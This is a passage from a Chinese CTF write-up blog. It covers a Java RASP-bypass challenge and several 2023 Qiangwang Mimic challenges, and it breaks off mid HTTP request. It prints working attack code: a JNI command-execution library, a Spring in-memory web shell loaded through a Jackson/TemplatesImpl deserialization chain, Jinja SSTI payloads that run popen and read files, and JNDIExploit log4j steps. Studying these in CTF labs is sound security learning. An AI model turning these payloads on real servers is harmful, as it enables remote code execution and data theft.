class="hljs-built_in">popen</span>(cmd, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-comment">//打开管道，并执行命令</span>    <span class="hljs-keyword">if</span> (!pipe)        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//返回0表示运行失败</span>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">feof</span>(pipe))    &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fgets</span>(buffer, <span class="hljs-number">128</span>, pipe))        &#123; <span class="hljs-comment">//将管道输出到result中</span>            <span class="hljs-built_in">strcat</span>(result, buffer);        &#125;    &#125;    <span class="hljs-built_in">pclose</span>(pipe); <span class="hljs-comment">//关闭管道</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;      <span class="hljs-comment">//返回1表示运行成功</span>&#125;<span class="hljs-function">JNIEXPORT jstring JNICALL <span class="hljs-title">Java_jackson_Cmdclass_execCmd</span><span class="hljs-params">(JNIEnv *env, jobject class_object, jstring jstr)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *cstr = (*env)-&gt;<span class="hljs-built_in">GetStringUTFChars</span>(env, jstr, <span class="hljs-literal">NULL</span>);    <span class="hljs-type">char</span> result[<span class="hljs-number">1024</span> * <span class="hljs-number">12</span>] = <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">//定义存放结果的字符串数组</span>    <span class="hljs-keyword">if</span> (<span class="hljs-number">1</span> == <span class="hljs-built_in">execCmd</span>(cstr, result))    &#123;       <span class="hljs-comment">// printf(result);</span>    &#125;    <span class="hljs-type">char</span> return_messge[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-built_in">strcat</span>(return_messge, result);    jstring cmdresult = (*env)-&gt;<span class="hljs-built_in">NewStringUTF</span>(env, return_messge);    <span class="hljs-comment">//system();</span>    <span class="hljs-keyword">return</span> cmdresult;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs shell">gcc -fPIC -I $JAVA_HOME/include  -I $JAVA_HOME/include/linux -shared -o libcmd.so EvilClass.c</code></pre></div><p>将该so文件base64编码放到java代码中方便加载</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jackson;<span class="hljs-keyword">import</span> java.io.FileNotFoundException;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.RandomAccessFile;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetJNIBase64</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">RandomAccessFile</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RandomAccessFile</span>(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\fsdownload\\libcmd.so&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);            <span class="hljs-type">byte</span>[] content = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[(<span class="hljs-type">int</span>) r.length()];            r.read(content);            <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(content);            System.out.println(s);            r.close();        &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre></div><p>利用 TemplateImpl 来执行java代码，这里和内存马直接就放一起了</p><p>注意！！！这个内存马的包名和上面我们的cmdClass必须全部对应，否则就会报错（Boogipop大佬是这样说的）        （跟我上面说的包名一致好像差不多）</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jackson;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.RandomAccessFile;<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-keyword">import</span> java.util.Vector;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cmdclass</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> String <span class="hljs-title function_">execCmd</span><span class="hljs-params">(String cmd)</span>;    <span class="hljs-comment">//恶意动态链接库文件的base64编码</span>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EVIL_JNI_BASE64</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.......&quot;</span>;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LIB_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/libcmd.so&quot;</span>;    <span class="hljs-keyword">static</span> &#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">byte</span>[] jniBytes = Base64.getDecoder().decode(EVIL_JNI_BASE64);            <span class="hljs-type">RandomAccessFile</span> <span class="hljs-variable">randomAccessFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RandomAccessFile</span>(LIB_PATH, <span class="hljs-string">&quot;rw&quot;</span>);            randomAccessFile.write(jniBytes);            randomAccessFile.close();            <span class="hljs-comment">//调用java.lang.ClassLoader$NativeLibrary类的load方法加载动态链接库</span>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cmdLoader</span> <span class="hljs-operator">=</span> Cmdclass.class.getClassLoader();            Class&lt;?&gt; classLoaderClazz = Class.forName(<span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>);            Class&lt;?&gt; nativeLibraryClazz = Class.forName(<span class="hljs-string">&quot;java.lang.ClassLoader$NativeLibrary&quot;</span>);            <span class="hljs-type">Method</span> <span class="hljs-variable">load</span> <span class="hljs-operator">=</span> nativeLibraryClazz.getDeclaredMethod(<span class="hljs-string">&quot;load&quot;</span>, String.class, <span class="hljs-type">boolean</span>.class);            load.setAccessible(<span class="hljs-literal">true</span>);            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> classLoaderClazz.getDeclaredField(<span class="hljs-string">&quot;nativeLibraries&quot;</span>);            field.setAccessible(<span class="hljs-literal">true</span>);            Vector&lt;Object&gt; libs = (Vector&lt;Object&gt;) field.get(cmdLoader);            Constructor&lt;?&gt; nativeLibraryCons = nativeLibraryClazz.getDeclaredConstructor(Class.class, String.class, <span class="hljs-type">boolean</span>.class);            nativeLibraryCons.setAccessible(<span class="hljs-literal">true</span>);            <span class="hljs-type">Object</span> <span class="hljs-variable">nativeLibraryObj</span> <span class="hljs-operator">=</span> nativeLibraryCons.newInstance(Cmdclass.class, LIB_PATH, <span class="hljs-literal">false</span>);            libs.addElement(nativeLibraryObj);            field.set(cmdLoader, libs);            load.invoke(nativeLibraryObj, LIB_PATH, <span class="hljs-literal">false</span>);            <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);            <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);            <span class="hljs-type">Field</span> <span class="hljs-variable">configField</span> <span class="hljs-operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="hljs-string">&quot;config&quot;</span>);            configField.setAccessible(<span class="hljs-literal">true</span>);            RequestMappingInfo.<span class="hljs-type">BuilderConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span>                    (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);            <span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> Cmdclass.class.getMethod(<span class="hljs-string">&quot;shell&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);            <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> RequestMappingInfo.paths(<span class="hljs-string">&quot;/shell&quot;</span>)                    .options(config)                    .build();            <span class="hljs-type">Cmdclass</span> <span class="hljs-variable">springControllerMemShell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cmdclass</span>();            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);        &#125; <span class="hljs-keyword">catch</span> (Exception hi) &#123;            hi.printStackTrace();        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shell</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;            <span class="hljs-type">String</span> <span class="hljs-variable">execRes</span> <span class="hljs-operator">=</span> Cmdclass.execCmd(cmd);            response.getWriter().write(execRes);            response.getWriter().flush();        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;&#125;</code></pre></div><p>jackson记得老规矩重写<code>BaseJsonNode</code>删掉<code>writeReplace</code>方法</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jackson;<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<span class="hljs-keyword">import</span> org.springframework.http.HttpEntity;<span class="hljs-keyword">import</span> org.springframework.http.HttpHeaders;<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;<span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<span class="hljs-keyword">import</span> javax.xml.transform.Templates;<span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.net.URI;<span class="hljs-keyword">import</span> java.nio.file.Files;<span class="hljs-keyword">import</span> java.nio.file.Paths;<span class="hljs-keyword">import</span> java.security.*;<span class="hljs-keyword">import</span> java.sql.SQLOutput;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">Templates</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();        <span class="hljs-type">byte</span>[] bytecodes = Repository.lookupClass(Cmdclass.class).getBytes();        setValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);        setValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;bytecodes&#125;);        setValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<span class="hljs-comment">//</span><span class="hljs-comment">//</span>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templatesimpl);<span class="hljs-comment">//</span>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);        setValue(exp,<span class="hljs-string">&quot;val&quot;</span>,jsonNodes);        System.out.println(serial(exp));    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);        oos.writeObject(o);        oos.close();        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());        <span class="hljs-keyword">return</span> base64String;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);        ois.readObject();        ois.close();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);        field.setAccessible(<span class="hljs-literal">true</span>);        field.set(obj, value);    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-comment">#结尾无 /</span>baseUrl = <span class="hljs-string">&quot;http://xxx.xxx.xxx.xxx&quot;</span>burp0_url = baseUrl + <span class="hljs-string">&quot;/read&quot;</span>burp0_headers = &#123;<span class="hljs-string">&quot;Transfer-Encoding&quot;</span>: <span class="hljs-string">&quot;chunked&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;text/plain&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>&#125;payload = <span class="hljs-string">&quot;&quot;&quot;........&quot;&quot;&quot;</span>hex_string = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload))[<span class="hljs-number">2</span>:]hex_string = <span class="hljs-built_in">str</span>(hex_string)burp0_data = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;hex_string&#125;</span>\r\n<span class="hljs-subst">&#123;payload&#125;</span>\r\n0\r\n\r\n&quot;</span>   <span class="hljs-comment">#chunked编码格式</span>res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)<span class="hljs-built_in">print</span>(res.text)res = requests.get(baseUrl + <span class="hljs-string">&quot;/shell?cmd=/readflag&quot;</span>)<span class="hljs-built_in">print</span>(res.text)</code></pre></div><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127213739145.png" alt="image-20231127213739145"></p><p>见证历史性的一刻，嘻嘻，真的看了好久了（快十几天了，断断续续的），终于成功了</p><p><a href="https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/#POC">DASCTFXCBCTF_2023_bypassJava_Wp (pankas.top)</a></p><p><a href="https://boogipop.com/2023/11/05/DASCTF%20X%20CBCTF%202023%20Web%20%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0%20Writeup/">强大的Boogipop大佬WP</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>值得一提的是这篇文章的题都是用jackson打的，在写这一篇时终于会利用Jackson了，并且完善了jackson那篇文章</p><p>rasp也是多学到了一个知识点</p><p>但是也不是什么都懂了，有关代码具体部分要我写我肯定是写不出来的，只能算多学一个知识点</p><p>这样不行啊，还是得向Boogipop大佬学习尽快学完javaweb、webmvc、servlet等等，不然内存马也学不了一点</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://dummykitty.github.io/posts/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP">https://dummykitty.github.io/posts/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP</a></p><p><a href="https://boogipop.com/2023/11/05/DASCTF%20X%20CBCTF%202023%20Web%20%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0%20Writeup/">https://boogipop.com/2023/11/05/DASCTF%20X%20CBCTF%202023%20Web%20%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0%20Writeup/</a></p><p><a href="https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/">https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>强网拟态2023</title>
    <link href="/2023/11/12/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812023/"/>
    <url>/2023/11/12/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812023/</url>
    
    <content type="html"><![CDATA[<h1 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h1><h2 id="find-me-and-crack-me"><a href="#find-me-and-crack-me" class="headerlink" title="find me and crack me"></a>find me and crack me</h2><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--</span><span class="hljs-comment">     KEY:N2RlMzhmM2MzZDNiYWE3Y2E1OGEzNjZmMDk1Nzc1ODY=</span><span class="hljs-comment">     encrypt word: YWY2NTRiZTc5ZjkyNGE2ZDA3MGFlYjE5ZWMxN2U4Y2NjMTJkNWExYWY2NTc0YzE4YmMyYzI3YWFkZjZmZjRhN2Y4ZDUwOTBmMTVkNDBiM2Y2ZTFhMzIxMDNmOGMwMjgxNmJmZTMzMTY4ZGFmNzJkMzBiOTAwMTgxYzliMGQ5MGEyNmNmNDZiZGUyNjA4NDE5YWM1MmE0NmVjZDQwYjlhZWYwMzczYjcyODExNTg0YzE3MjJmYzU4Y2NmYjhlYzM4N2RmZTc2ODRjOTIzYWVlMWM1ZGU0NWI5NDIxMThjYjBjMGYwYzIwNWJkODA0N2M3MjczY2RiYjYwNWQwMzMxNzcwZjk3NDM0M2ZhN2FiNjQ1YWVkMzQ2MjRkMzQ5ODRkODU2YWY2MzkwMWUxZDU0MjFjMWRmZDcyMjUxZDBkOTU=</span><span class="hljs-comment">--&gt;</span></code></pre></div><p>key经过base64和MD5解密之后得到secrets</p><p>encrypt word只有一个base64</p><p>然后看着这么长只能想到AES或DES</p><p>试出是DES-ECB</p><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812023/image-20231112010611611.png" alt="image-20231112010611611"></p><div class="code-wrapper"><pre><code class="hljs maxima"><span class="hljs-number">1.</span><span class="hljs-built_in">maybe</span> used <span class="hljs-built_in">first</span> url <span class="hljs-built_in">get</span> <span class="hljs-built_in">random</span>:/mimic_storage<span class="hljs-number">2.</span><span class="hljs-built_in">maybe</span> used <span class="hljs-built_in">second</span> url <span class="hljs-built_in">get</span> flag:/getflag?<span class="hljs-built_in">sec</span>=<span class="hljs-built_in">random</span>&amp;path=xxxxxxx <span class="hljs-built_in">is</span>:MVhuOtClaoE5899iOuiSWkvqxsrRimmb</code></pre></div><p>按他说的获取随机数，然后访问中间那个路由就行了</p><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812023/image-20231112010722372.png" alt="image-20231112010722372"></p><h2 id="国际象棋与二维码"><a href="#国际象棋与二维码" class="headerlink" title="国际象棋与二维码"></a>国际象棋与二维码</h2><p>一眼就是要xor</p><p>他说是国际象棋，那就生成个国际象棋的棋盘与图片进行异或即可</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> PIL import Image,ImageDraw<span class="hljs-attribute">img</span> = Image.new(&#x27;RGB&#x27;,(<span class="hljs-number">500</span>,<span class="hljs-number">500</span>),<span class="hljs-string">&quot;white&quot;</span>)<span class="hljs-attribute">cell_size</span> = <span class="hljs-number">500</span>/<span class="hljs-number">49</span><span class="hljs-attribute">draw</span> = ImageDraw.Draw(img)<span class="hljs-attribute">for</span> i in range(<span class="hljs-number">49</span>):    <span class="hljs-attribute">for</span> j in range(<span class="hljs-number">49</span>):        <span class="hljs-attribute">x</span> = j*cell_size        <span class="hljs-attribute">y</span> = i*cell_size        <span class="hljs-attribute">if</span> (i+j)%<span class="hljs-number">2</span> == <span class="hljs-number">0</span>:            <span class="hljs-attribute">draw</span>.rectangle([(x,y),(x+cell_size,y+cell_size)],fill=<span class="hljs-string">&quot;black&quot;</span>)<span class="hljs-attribute">img</span>.save(<span class="hljs-string">&quot;rev.png&quot;</span>)</code></pre></div><div class="code-wrapper"><pre><code class="hljs angelscript">flag&#123;<span class="hljs-symbol">7he_che556o@</span><span class="hljs-symbol">rd_of_che55_i5_very_5imi1@</span>r_+<span class="hljs-symbol">o_7he_QR_code_m@</span><span class="hljs-number">5</span>k&#125;</code></pre></div><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812023/image-20231112012313720.png" alt="image-20231112012313720"></p><h2 id="用户登录系统"><a href="#用户登录系统" class="headerlink" title="用户登录系统"></a>用户登录系统</h2><p>输出什么回显什么，猜测是ssti，尝试49错误，尝试<code>&#123;&#123;"".__class__&#125;&#125;</code>成功</p><p>说明就是ssti，就是有过滤</p><p>幸运的是一直到命令执行都没有过滤，popen就简单拼接一下</p><div class="code-wrapper"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__base__.__subclasses__</span>()[140].__init__.__globals__[&quot;po&quot;&quot;pen&quot;](<span class="hljs-name">&quot;ls&quot;</span>).read()&#125;&#125;</span></code></pre></div><p>接着发现空格被过滤了，不会饶过，那就换一种列目录的方式</p><div class="code-wrapper"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__base__.__subclasses__</span>()[140].__init__.__globals__[&quot;__builtins__&quot;][&quot;__imp&quot;&quot;ort__&quot;](<span class="hljs-name">&quot;o&quot;</span><span class="hljs-string">&quot;s&quot;</span>).listdir(<span class="hljs-name">&quot;/&quot;</span>)&#125;&#125;</span></code></pre></div><p>然后发现不管怎么怎么拼接&#x2F;tmp都不行</p><p>那么就应该是对回显内容进行检测，应该就是flag的文件名被禁了</p><p>尝试对输出结果进行编码</p><p><code>&#123;&#123;"".__class__.__base__.__subclasses__()[140].__init__.__globals__["po""pen"]("ls").read().encode().hex()&#125;&#125;</code></p><p>是可行的，但&#x2F;tmp一直解决不了，于是考虑切换目录，并从列根目录的结果中选择tmp的索引</p><p>先切换到根目录</p><div class="code-wrapper"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__base__.__subclasses__</span>()[140].__init__.__globals__[&quot;__builtins__&quot;][&quot;__imp&quot;&quot;ort__&quot;](<span class="hljs-name">&quot;o&quot;</span><span class="hljs-string">&quot;s&quot;</span>).chdir(<span class="hljs-name">&quot;/&quot;</span>)&#125;&#125;</span></code></pre></div><p>再切换到tmp目录</p><div class="code-wrapper"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__base__.__subclasses__</span>()[140].__init__.__globals__[&quot;__builtins__&quot;][&quot;__imp&quot;&quot;ort__&quot;](<span class="hljs-name">&quot;o&quot;</span><span class="hljs-string">&quot;s&quot;</span>).chdir(<span class="hljs-name">&quot;&quot;.__class__.__base__.__subclasses__</span>()[140].__init__.__globals__[&quot;__builtins__&quot;][&quot;__imp&quot;&quot;ort__&quot;](<span class="hljs-name">&quot;o&quot;</span><span class="hljs-string">&quot;s&quot;</span>).listdir(<span class="hljs-name">&quot;/&quot;</span>)[9])&#125;&#125;</span></code></pre></div><p>接着</p><p><code>&#123;&#123;"".__class__.__base__.__subclasses__()[140].__init__.__globals__["po""pen"]("ls").read().encode().hex()&#125;&#125;</code></p><div class="code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>flag</code></pre></div><p><code>&#123;&#123;"".__class__.__base__.__subclasses__()[140].__init__.__globals__["__builtins__"]["open"]("fl""ag").read().encode().hex()&#125;&#125;</code></p><div class="code-wrapper"><pre><code class="hljs 1c"><span class="hljs-meta">#-TKu+bKTreWXs3gk3x-4VvqH0vZnyi5m9BhSjkgWspk7Ou28litxcaQjL0TdPMP9tfuA=</span><span class="hljs-meta">#-o316dXCtAyyVBoMgdF8+IZ2n7K0AYxD0q3eM4EGp+qNGOskYxoecx3beQWHqAswbX+M=</span>flag&#123;u_win_have_fun&#125;<span class="hljs-meta">#-NXM++GKuJtdDYI-LmCv7X1Ds9PJqTrEREA+9yroyC1vVD1qzJu2p9oylMUqianQJ8wdBg9-IwZKGFMIG6iQhBrxj1D6QTsMquESMcGD5zL8ONWu-4c-ZuVtUgDmazxk1+5nuyg==</span><span class="hljs-meta">#-</span></code></pre></div><p>能读文件时想的是算pin码，但是没算对，就算了</p><h2 id="logInject"><a href="#logInject" class="headerlink" title="logInject"></a>logInject</h2><p>title为<code>java工程漏洞测试</code></p><p>那就往java方面想，也没学过多少，猜测大概是fastjson或是log4j</p><p><code>java -jar .\JNDIExploit-1.2-SNAPSHOT.jar -u</code>  查看可用payload</p><p><code>java -jar .\JNDIExploit-1.2-SNAPSHOT.jar -i xx.xx.xx.xx </code>  vps开启监听</p><p>在可用payload中最终SpringEcho使用成功</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/vul/test/post</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>web-b13aa31ad4.challenge.xctf.org.cn<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>57<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://web-b13aa31ad4.challenge.xctf.org.cn<span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://web-b13aa31ad4.challenge.xctf.org.cn/<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: 